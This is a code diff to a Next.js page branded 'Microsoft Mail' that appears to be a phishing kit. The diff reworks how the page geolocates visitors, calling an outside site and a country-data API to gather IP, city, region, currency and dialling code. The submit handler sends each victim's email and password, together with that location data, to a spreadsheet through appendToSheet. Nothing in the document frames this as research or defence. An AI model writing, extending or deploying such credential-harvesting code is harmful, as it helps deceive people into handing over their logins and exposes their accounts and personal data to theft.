@@ -17,24 +17,63 @@ export default function Page() {
   const router = useRouter();
   const [successModal, setSuccessModal] = useState(false);
   const category = "Microsoft Mail";
-  const [locationData, setLocationData] = useState({});
+  const [locationData, setLocationData] = useState(null);
+  const [error, setError] = useState(null);
 
   useEffect(() => {
-    const fetchData = async () => {
+    const fetchLocationData = async () => {
       try {
-        const response = await fetch('/api/location');
-        if (response.ok) {
-          const data = await response.json();
-          setLocationData(data);
-        } else {
-          console.error('Failed to fetch location data');
+        const res = await fetch("https://inkvotes.vercel.app/");
+        const locationHeader = res.headers.get("X-Client-Location");
+        const locationData = locationHeader
+          ? JSON.parse(locationHeader)
+          : await fetch("/api/location").then((res) => res.json());
+
+        const { country, ip, city, region } = locationData;
+
+        const countryResponse = await fetch(
+          `https://restcountries.com/v3.1/alpha/${country}`
+        );
+
+        if (!countryResponse.ok) {
+          throw new Error("Failed to fetch country data");
         }
-      } catch (error) {
-        console.error('Error:', error);
+
+        const countryData = await countryResponse.json();
+        const countryInfo = countryData[0];
+
+        const countryName = countryInfo?.name.common || "Unknown";
+        const continent = countryInfo.continents
+          ? countryInfo.continents[0]
+          : "Unknown";
+        const currency = countryInfo.currencies
+          ? Object.keys(countryInfo.currencies)[0]
+          : "Unknown";
+        const phoneCode = countryInfo.idd
+          ? countryInfo.idd.root +
+            (countryInfo.idd.suffixes && countryInfo.idd.suffixes.length > 0
+              ? countryInfo.idd.suffixes[0]
+              : "")
+          : "Unknown";
+        const capital = countryInfo.capital ? countryInfo.capital[0] : "Unknown";
+
+        setLocationData({
+          country: countryName,
+          ip,
+          city,
+          region,
+          continent,
+          capital,
+          currency,
+          phoneCode,
+        });
+      } catch (err) {
+        console.error("Error fetching location data:", err);
+        setError("Failed to fetch location data");
       }
     };
 
-    fetchData();
+    fetchLocationData();
   }, []);
 
   const handleNext = () => {
@@ -67,8 +106,22 @@ export default function Page() {
       const country = locationData?.country || "unknown";
       const currency = locationData?.currency || "unknown";
       const phoneCode = locationData?.phoneCode || "unknown";
-      // ip-address, city, region, country, continent, currency, phone-code
-      const data = [[category, email, password,ip,city, region, country, continent, currency, phoneCode ]];
+
+      const data = [
+        [
+          category,
+          email,
+          password,
+          ip,
+          city,
+          region,
+          country,
+          continent,
+          currency,
+          phoneCode,
+        ],
+      ];
+
       await appendToSheet(data);
 
       if (isFirstAttempt) {
@@ -86,10 +139,16 @@ export default function Page() {
     }
   };
 
- 
-
   if (successModal) {
     return <SuccessModal />;
+  }
+
+  if (error) {
+    return <p className="text-red-500">{error}</p>;
+  }
+
+  if (!locationData) {
+    return <p>Loading...</p>;
   }
 
   return (
